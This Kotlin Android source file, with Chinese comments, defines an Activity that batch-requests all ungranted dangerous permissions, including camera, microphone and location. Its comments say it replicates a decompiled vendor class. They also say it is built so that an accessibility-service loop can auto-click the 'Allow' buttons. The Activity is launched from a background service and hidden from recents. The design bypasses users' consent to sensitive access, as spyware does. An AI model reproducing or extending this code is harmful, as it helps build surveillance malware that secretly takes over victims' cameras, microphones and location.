package com.storm.safe.rock.service.modules.yw5xud

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.core.app.ActivityCompat

/**
 * HuaweiPermissionRequestActivity — 对齐 vendor C0365a2.java L3674 (m212194f1)。
 *
 * Step 1 基础权限流程中，通过独立 Activity 主动触发 `POST_NOTIFICATIONS`
 * 权限请求弹窗（Android 13+），让 HuaweiSteps.executeStep1BasicPermissions
 * 的 10s 轮询循环能检测到"允许/始终允许/仅使用期间允许"按钮并点击。
 *
 * ADAPT: vendor 用主线程 post Runnable 调 `requestPermissions`；replica 改为
 *        独立 Activity 形式，便于 AccessibilityService 作为 Context 启动（Android 10+
 *        禁止后台 service 直接 startActivity，但 Activity 自身有 permission request API）。
 */
class HuaweiPermissionRequestActivity : Activity() {

    companion object {
        private const val TAG = "HwPermReqAct"
        private const val REQUEST_CODE = 12094

        /**
         * @deprecated 只请求 POST_NOTIFICATIONS，真机场景（Android 12 及以下）会导致
         * CAMERA/RECORD_AUDIO/LOCATION 等 runtime 权限**永远不会触发弹窗**。
         * 请使用 [computeRequiredPermissions] 替代，读 manifest 所有 dangerous 权限。
         */
        @Deprecated(
            "Use computeRequiredPermissions(context) — reads all dangerous perms from manifest",
            ReplaceWith("computeRequiredPermissions(context)")
        )
        fun requiredPermissions(targetSdk: Int = Build.VERSION.SDK_INT): List<String> {
            return if (targetSdk >= Build.VERSION_CODES.TIRAMISU) {
                listOf(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                emptyList()
            }
        }

        /** 构造 service 启动此 Activity 所需 Intent。 */
        fun launchIntent(context: Context): Intent {
            return Intent(context, HuaweiPermissionRequestActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
        }

        /**
         * 读取 manifest 所有 dangerous 权限中未授予的项，返回待请求列表。
         * 对齐 vendor C0365a2.java m212194f1 — 批量触发所有危险权限弹窗。
         *
         * 过滤步骤：
         *  1. `PackageManager.getPackageInfo(flags=GET_PERMISSIONS).requestedPermissions` — manifest 声明的全部权限
         *  2. `getPermissionInfo(perm).protection == PROTECTION_DANGEROUS` — 只要 runtime 权限（排除 normal/signature）
         *  3. `checkSelfPermission(perm) != PERMISSION_GRANTED` — 只请求未授予的
         *
         * ADAPT: vendor 在 `m212194f1` 内部硬编码权限数组；replica 改为 manifest 读取，
         *        避免权限列表与 manifest 脱节，未来加权限时无需改这个方法。
         *
         * @return 待请求权限列表（顺序与 manifest 一致），空表 = 全部已授予
         */
        fun computeRequiredPermissions(context: Context): List<String> {
            val pm = context.packageManager ?: return emptyList()
            val declared = try {
                val pi = pm.getPackageInfo(
                    context.packageName,
                    android.content.pm.PackageManager.GET_PERMISSIONS
                )
                pi.requestedPermissions?.toList() ?: emptyList()
            } catch (_: Exception) {
                emptyList()
            }
            if (declared.isEmpty()) return emptyList()

            // ADAPT: Android R+ 规则 — ACCESS_BACKGROUND_LOCATION 必须在 foreground location
            // 已授予后单独请求。批量请求含此权限会导致整个 requestPermissions 被 PermissionController
            // 整体拒绝（日志: "For R+ apps, background permissions must be requested after
            // foreground permissions are already granted"）。将其从首次请求中排除。
            val excludedFromBatch = setOf(
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            )

            return declared.filter { perm ->
                if (perm in excludedFromBatch) return@filter false
                // 过滤 1: 只要 dangerous 权限
                val isDangerous = try {
                    val info = pm.getPermissionInfo(perm, 0)
                    val protection = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                        info.protection
                    } else {
                        @Suppress("DEPRECATION")
                        info.protectionLevel and android.content.pm.PermissionInfo.PROTECTION_MASK_BASE
                    }
                    protection == android.content.pm.PermissionInfo.PROTECTION_DANGEROUS
                } catch (_: android.content.pm.PackageManager.NameNotFoundException) {
                    false  // 系统不识别此权限（SDK 过低） — 跳过
                } catch (_: Exception) {
                    false
                }
                if (!isDangerous) return@filter false

                // 过滤 2: 只请求未 granted 的
                val granted = try {
                    context.checkSelfPermission(perm) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } catch (_: Exception) {
                    false
                }
                !granted
            }
        }
    }

    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val safetyFinishRunnable = Runnable {
        Log.w(TAG, "safety-finish: 30s timeout reached, forcing finish()")
        if (!isFinishing) finish()
    }

    // ADAPT: 真机修复 — onCreate 里调用 requestPermissions 时 Activity lifecycle 尚未
    // 稳定到 RESUMED 状态，GrantPermissionsActivity 启动后可能在 ~100ms 内被 dismiss，
    // 导致 onRequestPermissionsResult 立即以 granted=false 返回（实际没有任何用户交互）。
    // 解决：移到 onResume 里首次触发，用 requestLaunched flag 防止 Activity 重入时重复请求。
    private var requestLaunched = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // ADAPT: 真机修复 — 批量请求 manifest 所有未授予的 dangerous 权限，对齐 vendor m212194f1
        val perms = computeRequiredPermissions(this)
        if (perms.isEmpty()) {
            Log.i(TAG, "onCreate: manifest 所有 dangerous 权限已授予，直接 finish")
            finish()
            return
        }
        Log.i(TAG, "onCreate: 待请求 ${perms.size} 个权限，等待 onResume 触发 requestPermissions")
        // Safety net: 批量请求时系统会逐个弹窗，保守给 30s timeout
        mainHandler.postDelayed(safetyFinishRunnable, 30_000L)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        mainHandler.removeCallbacks(safetyFinishRunnable)
        if (requestCode == REQUEST_CODE) {
            val grantedCount = grantResults.count { it == android.content.pm.PackageManager.PERMISSION_GRANTED }
            Log.i(TAG, "onRequestPermissionsResult: code=$requestCode granted=$grantedCount/${grantResults.size}")
        }
        finish()
    }

    override fun onResume() {
        super.onResume()
        val perms = computeRequiredPermissions(this)
        if (perms.isEmpty()) {
            // 已经全部 granted（系统弹窗被接受后 Activity resume 走此路径）
            Log.i(TAG, "onResume: 所有 dangerous 权限已授予，finish()")
            mainHandler.removeCallbacks(safetyFinishRunnable)
            if (!isFinishing) finish()
            return
        }
        // ADAPT: 真机修复 — 首次 onResume 时发起 requestPermissions
        // Activity lifecycle 稳定到 RESUMED 状态再请求，可避免 GrantPermissionsActivity 被
        // 生命周期竞争打断（~100ms 内 granted=false 的问题）。
        if (!requestLaunched) {
            requestLaunched = true
            Log.i(TAG, "onResume: requestPermissions(count=${perms.size}): ${perms.take(3)}... → 等待系统逐个弹窗")
            ActivityCompat.requestPermissions(this, perms.toTypedArray(), REQUEST_CODE)
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacks(safetyFinishRunnable)
        super.onDestroy()
    }
}
